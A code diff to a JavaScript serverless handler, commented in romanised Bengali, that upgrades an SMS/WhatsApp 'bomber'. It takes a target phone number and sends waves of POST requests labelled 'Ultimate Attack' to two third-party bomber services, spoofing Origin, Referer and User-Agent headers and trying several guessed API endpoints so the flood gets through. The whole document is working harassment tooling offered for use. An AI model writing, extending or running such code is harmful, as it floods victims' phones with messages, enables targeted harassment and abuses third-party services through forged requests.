@@ -5,10 +5,21 @@ export default async function handler(req, res) {
 
   const { number, amount, isUltimate } = req.body;
 
-  // Target Links - Ekhane amra direct endpoint hit korbo
-  const targetLinks = [
-    'https://shadowx-sms-bomber.onrender.com/api/send', 
-    'https://nuke-sms-bomber.pages.dev/api/attack'
+  // Common API Endpoints jeta sob bomber site use kore
+  const potentialEndpoints = [
+    '/api/send',
+    '/api/v1/send',
+    '/api/v1/attack',
+    '/api/sms/send',
+    '/api/bomb',
+    '/api/v2/attack',
+    '/api/send-sms'
+  ];
+
+  // Tomar dewa main links
+  const baseLinks = [
+    'https://shadowx-sms-bomber.onrender.com',
+    'https://nuke-sms-bomber.pages.dev'
   ];
 
   const runAttack = async () => {
@@ -16,28 +27,40 @@ export default async function handler(req, res) {
     const delay = isUltimate ? 500 : 2000; 
 
     for (let i = 0; i < totalWaves; i++) {
-      // Amra ekhane ekta fake user agent ebong headers use korbo
-      const attackPromises = targetLinks.map(link => 
-        fetch(link, {
-          method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json',
-            'Accept': 'application/json',
-            'Origin': 'https://shadowx-sms-bomber.onrender.com', // Spoofing Origin
-            'Referer': 'https://shadowx-sms-bomber.onrender.com/', // Spoofing Referer
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
-          },
-          body: JSON.stringify({
-            number: number,
-            amount: 1,
-            country: "BD",
-            service: "whatsapp",
-            msg: "ULTIMATE ATTACK"
-          }),
-        }).catch(err => console.log("Wave Error:", err.message))
-      );
+      // Amra protibar protita base link er sathe potential endpoints gulo check korbo
+      const attackPromises = [];
 
+      baseLinks.forEach(baseUrl => {
+        potentialEndpoints.forEach(endpoint => {
+          attackPromises.push(
+            fetch(baseUrl + endpoint, {
+              method: 'POST',
+              headers: { 
+                'Content-Type': 'application/json',
+                'Accept': 'application/json',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
+                'X-Requested-With': 'XMLHttpRequest',
+                'Origin': baseUrl,
+                'Referer': baseUrl + '/'
+              },
+              body: JSON.stringify({
+                number: number,
+                amount: 1,
+                country: "BD",
+                service: "whatsapp",
+                msg: "Ultimate Attack",
+                phone: number, // alternative key
+                mobile: number  // alternative key
+              }),
+            }).catch(err => null) // Error handle korbe jate loop bondho na hoy
+          );
+        });
+      });
+
+      // Sob request eksathe pathabe
       await Promise.all(attackPromises);
+
+      // Delay control
       await new Promise(resolve => setTimeout(resolve, delay));
     }
   };
